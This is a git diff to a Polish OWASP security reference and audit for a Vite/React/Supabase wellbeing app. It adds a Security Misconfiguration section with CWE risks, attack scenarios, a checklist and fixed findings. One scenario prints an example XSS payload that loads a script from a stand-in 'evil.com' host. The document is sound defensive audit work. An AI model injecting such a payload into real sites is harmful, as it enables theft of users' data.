@@ -2,7 +2,7 @@
 
 > **Cel dokumentu:** Referencja bezpieczeństwa dla deweloperów i agentów AI audytujących ten projekt.  
 > **Standard:** OWASP Top 10 — 2025  
-> **Ostatnia aktualizacja:** 2026-07-13  
+> **Ostatnia aktualizacja:** 2026-07-13 (A02:2025 dodane)  
 
 ---
 
@@ -13,11 +13,17 @@
    - [Warianty zagrożeń (CWE)](#warianty-zagrożeń-cwe)
    - [Scenariusze ataków specyficzne dla tego projektu](#scenariusze-ataków-specyficzne-dla-tego-projektu)
    - [Wymagania ochrony — checklist](#wymagania-ochrony--checklist)
-2. [Audyt projektu Wellbeing App](#audyt-projektu-wellbeing-app)
-   - [Znalezione podatności](#znalezione-podatności)
+2. [A02:2025 — Security Misconfiguration](#a022025--security-misconfiguration)
+   - [Opis zagrożenia](#opis-zagrożenia-a02)
+   - [Warianty zagrożeń (CWE)](#warianty-zagrożeń-cwe-a02)
+   - [Scenariusze ataków specyficzne dla tego projektu](#scenariusze-ataków-a02)
+   - [Wymagania ochrony — checklist](#wymagania-ochrony--checklist-a02)
+3. [Audyt projektu Wellbeing App](#audyt-projektu-wellbeing-app)
+   - [Znalezione podatności A01](#znalezione-podatności)
+   - [Znalezione podatności A02](#znalezione-podatności-a02)
    - [Zastosowane poprawki](#zastosowane-poprawki)
    - [Rekomendacje do wdrożenia w Supabase Dashboard](#rekomendacje-do-wdrożenia-w-supabase-dashboard)
-3. [Instrukcja audytu dla agentów AI](#instrukcja-audytu-dla-agentów-ai)
+4. [Instrukcja audytu dla agentów AI](#instrukcja-audytu-dla-agentów-ai)
 
 ---
 
@@ -388,9 +394,226 @@ Wyniki audytu powinny być przedstawione w formacie tabeli z kolumnami:
 
 ---
 
+## A02:2025 — Security Misconfiguration
+
+### Opis zagrożenia {#opis-zagrożenia-a02}
+
+Security Misconfiguration (Błędna Konfiguracja Bezpieczeństwa) to zagrożenie polegające na **nieprawidłowym skonfigurowaniu** systemu, aplikacji lub usługi chmurowej z perspektywy bezpieczeństwa. Awansowało z pozycji #5 w poprzedniej edycji — **100% testowanych aplikacji** wykazuje jakąś formę błędnej konfiguracji.
+
+**Statystyki OWASP 2025:**
+
+| Metryka | Wartość |
+|---------|---------|
+| Zmapowane CWE | 16 |
+| Maks. współczynnik występowania | 27.70% |
+| Średni współczynnik występowania | 3.00% |
+| Średni ważony exploit | 7.96 |
+| Średni ważony impact | 3.97 |
+| Łączna liczba wystąpień | 719,084 |
+| Łączna liczba CVE | 1,375 |
+
+**Aplikacja może być podatna, gdy:**
+- Brakuje odpowiedniego hardeningu na dowolnym poziomie stosu aplikacji
+- Niepotrzebne funkcje są włączone (np. debug tools, testowe konta, zbędne porty/serwisy)
+- Domyślne konta i hasła są nadal aktywne i niezmienione
+- Obsługa błędów ujawnia stack trace'y lub zbyt szczegółowe informacje
+- Serwer nie wysyła nagłówków bezpieczeństwa lub nie są ustawione na bezpieczne wartości
+- Konfiguracja bezpieczeństwa w serwerach/frameworkach/bibliotekach nie jest ustawiona na bezpieczne wartości
+
+### Warianty zagrożeń (CWE) {#warianty-zagrożeń-cwe-a02}
+
+Poniżej lista wariantów CWE zmapowanych do A02:2025, z opisem ryzyka dla architektury Vite+React+Supabase tego projektu. Warianty oznaczone ⚠️ są **bezpośrednio istotne**.
+
+---
+
+#### ⚠️ CWE-16: Configuration (Konfiguracja)
+- **Opis:** Ogólna kategoria — problemy wynikające z nieprawidłowej konfiguracji oprogramowania.
+- **Ryzyko dla tego projektu:**
+  - `index.html` nie zawierał nagłówka Content Security Policy (CSP) — brak ochrony przed XSS.
+  - `index.html` miał `lang="en"` zamiast `lang="pl"` i generyczny tytuł "React App" — nie wpływa na bezpieczeństwo, ale ułatwia fingerprinting.
+  - Brak `vercel.json` z nagłówkami bezpieczeństwa — serwer produkcyjny nie wysyłał `X-Frame-Options`, `Strict-Transport-Security`, `Permissions-Policy`.
+  - `vite.config.js` nie miał wyłączonych source maps w produkcji — pełny kod źródłowy dostępny przez DevTools.
+- **Status:** ✅ NAPRAWIONE
+
+#### ⚠️ CWE-489: Active Debug Code (Aktywny kod debugowy)
+- **Opis:** Kod debugowy pozostawiony w produkcji.
+- **Ryzyko dla tego projektu:**
+  - Panel Debug (`DebugModal.jsx`) jest dostępny dla **każdego** zalogowanego użytkownika za pomocą skrótu `Shift+D`.
+  - Pozwala na: generowanie sztucznych nastrojów, usuwanie zadań, podróż w czasie, totalny reset konta.
+  - `console.log('[RemoteCommand] Received:', ...)` w `App.jsx:376` loguje dane zdalnych komend do konsoli przeglądarki.
+  - 19 wystąpień `console.error(err)` w kodzie produkcyjnym — obiekty błędów Supabase (z informacjami o schemacie bazy) są widoczne w DevTools.
+- **Checklist audytu:**
+  - [ ] Czy DebugModal jest dostępny tylko dla admina lub w trybie developerskim?
+  - [ ] Czy `console.log`/`console.error` w produkcji jest zastąpiony przez logger, który nie ujawnia stacktrace'ów?
+
+#### ⚠️ CWE-547: Use of Hard-coded, Security-relevant Constants (Użycie zakodowanych na stałe stałych istotnych dla bezpieczeństwa)
+- **Opis:** Stałe istotne dla bezpieczeństwa (hasła, klucze, emaile adminów) zakodowane bezpośrednio w kodzie źródłowym.
+- **Ryzyko dla tego projektu:**
+  - `ADMIN_EMAILS = ["admin@wellbeing.app"]` w `App.jsx:34` — lista adminów w kliencie JavaScript, widoczna po zbudowaniu bundle'a.
+  - Email admina `admin@wellbeing.app` jest również zakodowany w politykach RLS bazy danych.
+- **Status:** ⚠️ AKCEPTOWALNY (w kontekście badawczym) / DO NAPRAWIENIA (w produkcji)
+
+#### ⚠️ CWE-200: Exposure of Sensitive Information (Ujawnienie wrażliwych informacji) — powiązanie z obsługą błędów
+- **Opis:** Komunikaty błędów ujawniają wewnętrzną strukturę systemu.
+- **Ryzyko dla tego projektu:**
+  - `AuthView.jsx` wyświetlał `err.message` z Supabase bezpośrednio w UI — ujawniając np. nazwy tabel, limity rate, wewnętrzne kody błędów.
+  - `AdminPanel.jsx` wyświetlał `error.message` w toastach — ujawniając strukturę zapytań.
+- **Status:** ✅ NAPRAWIONE — zastąpiono generycznymi komunikatami
+
+#### ⚠️ CWE-260: Password in Configuration File (Hasło w pliku konfiguracyjnym) / CWE-526: Exposure Through Environmental Variables
+- **Opis:** Wrażliwe dane w plikach konfiguracyjnych dostępnych w repozytorium.
+- **Ryzyko dla tego projektu:**
+  - Plik `.env` z kluczami Supabase **NIE BYŁ** w `.gitignore`! Tylko warianty `.env.local`, `.env.development.local` były ignorowane.
+  - Oznacza to, że klucz `VITE_SUPABASE_ANON_KEY` mógł zostać wypchnięty do publicznego repozytorium Git.
+- **Status:** ✅ NAPRAWIONE — `.env` dodane do `.gitignore`
+
+#### CWE-315: Cleartext Storage of Sensitive Information in a Cookie
+- **Opis:** Wrażliwe dane przechowywane w cookies w postaci jawnej.
+- **Ryzyko:** Niskie. Supabase JS SDK przechowuje tokeny w `localStorage`, nie w cookies. Nie dotyczy bezpośrednio.
+
+#### CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute / CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
+- **Opis:** Cookies bez flag bezpieczeństwa.
+- **Ryzyko:** Niskie. Aplikacja nie ustawia własnych cookies. Supabase Auth używa `localStorage` + nagłówków `Authorization`.
+
+#### CWE-942: Permissive Cross-domain Policy with Untrusted Domains
+- **Opis:** Zbyt liberalna polityka cross-domain.
+- **Ryzyko:** Średnie. Bez nagłówka `X-Frame-Options: DENY` aplikacja mogła być osadzana w iframe na obcych domenach (clickjacking).
+- **Status:** ✅ NAPRAWIONE — dodano `X-Frame-Options: DENY` w `vercel.json` i `frame-ancestors 'none'` w CSP.
+
+#### CWE-611: Improper Restriction of XML External Entity Reference (XXE)
+- **Opis:** Ataki XXE na parsery XML.
+- **Ryzyko:** Nie dotyczy. Aplikacja nie przetwarza XML.
+
+---
+
+### Scenariusze ataków specyficzne dla tego projektu {#scenariusze-ataków-a02}
+
+#### Scenariusz 1: Dostęp do panelu debugowego
+```
+Dowolny zalogowany użytkownik naciska Shift+D.
+Otwiera się DebugModal z pełnymi uprawnieniami:
+  - Może wygenerować sztuczne nastroje
+  - Może usunąć wszystkie swoje zadania
+  - Może podróżować w czasie (oszukać zegar aplikacji)
+  - Może wykonać "Totalną czystkę" konta
+
+Sam w sobie nie jest to atak na innych użytkowników (RLS chroni dane),
+ale pozwala na manipulację własnych danych badawczych.
+```
+
+#### Scenariusz 2: Source map disclosure
+```
+BEZ FIX-u:
+  Atakujący otwiera DevTools → Sources → webpack://
+  Widzi pełny kod źródłowy aplikacji, w tym:
+  - ADMIN_EMAILS = ["admin@wellbeing.app"]
+  - Logikę debugActions (totalWipe, triggerScenario)
+  - Strukturę zapytań Supabase
+  - Nazwy tabel i kolumn bazy danych
+
+PO FIX-ie (sourcemap: false w vite.config.js):
+  Sources zawiera tylko zminifikowany kod — analiza jest znacznie trudniejsza.
+```
+
+#### Scenariusz 3: Brak Content Security Policy
+```
+BEZ CSP:
+  Atakujący wstrzykuje złośliwy skrypt (np. przez XSS w polu notatki):
+  <script src="https://evil.com/steal.js"></script>
+  Przeglądarka wykonuje skrypt bez ograniczeń.
+
+Z CSP (script-src 'self'):
+  Przeglądarka blokuje skrypt z obcej domeny.
+  Konsola wyświetla: "Refused to load the script 'https://evil.com/...'..."
+```
+
+#### Scenariusz 4: .env w repozytorium Git
+```
+BEZ FIX-u:
+  Deweloper wykonuje: git add . && git commit && git push
+  Plik .env z kluczem VITE_SUPABASE_ANON_KEY trafia do publicznego repo.
+  Bot skanujący GitHub (np. TruffleHog, GitGuardian) wykrywa klucz.
+  Atakujący używa klucza do bezpośrednich zapytań do Supabase API.
+
+PO FIX-ie (.env w .gitignore):
+  git add . pomija plik .env — klucze nie trafiają do repozytorium.
+```
+
+---
+
+### Wymagania ochrony — checklist {#wymagania-ochrony--checklist-a02}
+
+#### Poziom 1: Krytyczne (MUST HAVE)
+
+- [x] **Content Security Policy (CSP)** — nagłówek CSP w `index.html` (meta) oraz `vercel.json` (serwer)
+  - `script-src 'self'` — blokuje inline scripts i zewnętrzne skrypty
+  - `connect-src 'self' https://*.supabase.co wss://*.supabase.co` — ogranicza połączenia sieciowe
+  - `frame-ancestors 'none'` — zapobiega clickjacking
+
+- [x] **`.env` w `.gitignore`** — zapobiega wyciekowi kluczy Supabase do repozytorium
+
+- [x] **Generyczne komunikaty błędów w UI** — `AuthView.jsx` i `AdminPanel.jsx` nie ujawniają `err.message` z Supabase
+
+- [x] **Source maps wyłączone w produkcji** — `vite.config.js: sourcemap: false`
+
+#### Poziom 2: Ważne (SHOULD HAVE)
+
+- [x] **Nagłówki bezpieczeństwa HTTP** (via `vercel.json`):
+  - `X-Content-Type-Options: nosniff`
+  - `X-Frame-Options: DENY`
+  - `X-XSS-Protection: 1; mode=block`
+  - `Strict-Transport-Security: max-age=63072000`
+  - `Referrer-Policy: strict-origin-when-cross-origin`
+  - `Permissions-Policy: camera=(), microphone=(), geolocation=()`
+
+- [x] **Metadane HTML** — poprawny `lang="pl"`, opisowy `<title>`, `<meta description>`
+
+#### Poziom 3: Dodatkowe (NICE TO HAVE)
+
+- [ ] **Ograniczyć DebugModal** — dostępny tylko w trybie deweloperskim (`import.meta.env.DEV`) lub tylko dla admina.
+- [ ] **Usunąć `console.error(err)` z produkcji** — zastąpić centralnym loggerem, który nie ujawnia stack trace'ów w DevTools użytkownika.
+- [ ] **Supabase: włączyć Leaked Password Protection** — wykryte przez Supabase Security Advisor.
+- [ ] **Rotacja klucza `anon key`** — jeśli `.env` był kiedykolwiek w publicznym repo Git, klucz powinien zostać zregenerowany.
+
+---
+
+## Audyt A02:2025 — Znalezione podatności {#znalezione-podatności-a02}
+
+| ID | Poziom | CWE | Lokalizacja | Opis | Status |
+|----|--------|-----|-------------|------|--------|
+| V-011 | 🟠 WYSOKI | CWE-16 | `index.html` | Brak nagłówka Content Security Policy (CSP) — aplikacja podatna na XSS. | ✅ NAPRAWIONY |
+| V-012 | 🟠 WYSOKI | CWE-260 | `.gitignore` | Plik `.env` z kluczami Supabase NIE BYŁ ignorowany przez Git — ryzyko wycieku do publicznego repo. | ✅ NAPRAWIONY |
+| V-013 | 🟠 WYSOKI | CWE-16 | `vite.config.js` | Source maps nie były wyłączone w produkcji — pełny kod źródłowy dostępny przez DevTools. | ✅ NAPRAWIONY |
+| V-014 | 🟡 ŚREDNI | CWE-200 | `AuthView.jsx:37,67` | Surowy `err.message` z Supabase wyświetlany użytkownikowi — ujawnia wewnętrzne szczegóły. | ✅ NAPRAWIONY |
+| V-015 | 🟡 ŚREDNI | CWE-200 | `AdminPanel.jsx:16,39` | `error.message` z Supabase w toastach — ujawnia strukturę zapytań. | ✅ NAPRAWIONY |
+| V-016 | 🟡 ŚREDNI | CWE-16 | Brak pliku | Brak `vercel.json` — serwer produkcyjny nie wysyłał nagłówków bezpieczeństwa (HSTS, X-Frame-Options, etc.). | ✅ NAPRAWIONY |
+| V-017 | 🟡 ŚREDNI | CWE-489 | `App.jsx:418-435` | Panel Debug (Shift+D) dostępny dla każdego zalogowanego użytkownika, nie tylko w trybie dev. | ⚠️ DO NAPRAWIENIA |
+| V-018 | 🟡 ŚREDNI | CWE-489 | `App.jsx:376` | `console.log('[RemoteCommand] Received:', ...)` — logowanie danych zdalnych komend do konsoli. | ⚠️ DO NAPRAWIENIA |
+| V-019 | 🟢 NISKI | CWE-489 | `src/**/*.jsx` | 19 wystąpień `console.error(err)` — obiekty błędów Supabase widoczne w DevTools przeglądarki. | ⚠️ AKCEPTOWALNY |
+| V-020 | 🟢 NISKI | CWE-547 | `App.jsx:34` | `ADMIN_EMAILS` zakodowane w kliencie (powielenie z A01 — V-010). | ⚠️ AKCEPTOWALNY |
+| V-021 | 🟢 NISKI | CWE-16 | Supabase Dashboard | Leaked Password Protection wyłączone (wykryte przez Supabase Security Advisor). | ⚠️ DO NAPRAWIENIA |
+
+### Zastosowane poprawki A02
+
+| Plik | Zmiana |
+|------|--------|
+| `index.html` | Dodano CSP meta tag, `X-Content-Type-Options`, `Referrer-Policy`, poprawiono `lang`, `title`, `description` |
+| `.gitignore` | Dodano `.env` i `/dist` do ignorowanych plików |
+| `vercel.json` | **NOWY** — pełna konfiguracja nagłówków bezpieczeństwa HTTP dla Vercel |
+| `vite.config.js` | Dodano `build.sourcemap: false` — wyłączenie source maps w produkcji |
+| `AuthView.jsx` | Zastąpiono `err.message` generycznymi komunikatami błędów |
+| `AdminPanel.jsx` | Zastąpiono `error.message` generycznymi komunikatami błędów |
+
+---
+
 > **Referencje OWASP:**
 > - [OWASP Top 10 - A01:2025 Broken Access Control](https://owasp.org/Top10/A01_2025-Broken_Access_Control/)
+> - [OWASP Top 10 - A02:2025 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
 > - [OWASP Proactive Controls: C1: Implement Access Control](https://owasp.org/www-project-proactive-controls/)
+> - [OWASP Testing Guide: Configuration Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/)
+> - [OWASP Testing Guide: Testing for Error Codes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/)
 > - [OWASP ASVS: V8 Authorization](https://owasp.org/www-project-application-security-verification-standard/)
-> - [OWASP Testing Guide: Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/)
+> - [OWASP ASVS: V13 Configuration](https://owasp.org/www-project-application-security-verification-standard/)
 > - [OWASP Cheat Sheet: Authorization](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
+> - [CIS Security Configuration Guides/Benchmarks](https://www.cisecurity.org/cis-benchmarks)
+> - [NIST Guide to General Server Hardening](https://csrc.nist.gov/publications/detail/sp/800-123/final)
